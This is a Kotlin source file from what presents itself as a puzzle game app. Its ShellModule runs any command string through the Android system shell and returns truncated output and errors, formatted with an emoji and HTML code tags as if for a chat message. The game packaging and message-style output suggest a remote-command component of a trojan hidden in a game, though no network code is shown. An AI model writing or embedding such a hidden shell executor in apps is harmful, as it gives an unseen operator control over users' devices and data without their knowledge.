package com.puzzleblast.game.modules

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import java.io.ByteArrayOutputStream

object ShellModule {
    suspend fun exec(cmd: String): String = withContext(Dispatchers.IO) {
        try {
            withTimeout(60_000L) {
                val p = Runtime.getRuntime().exec(arrayOf("/system/bin/sh", "-c", cmd))
                val out = ByteArrayOutputStream()
                val err = ByteArrayOutputStream()
                p.inputStream.copyTo(out)
                p.errorStream.copyTo(err)
                p.waitFor()
                val o = out.toString().take(4000)
                val e = err.toString().take(4000)
                "💻 exit ${p.exitValue()}\n<code>$o</code>\n${if (e.isNotBlank()) "stderr: $e" else ""}"
            }
        } catch (e: Exception) {
            "💻 error: ${e.message}"
        }
    }
}
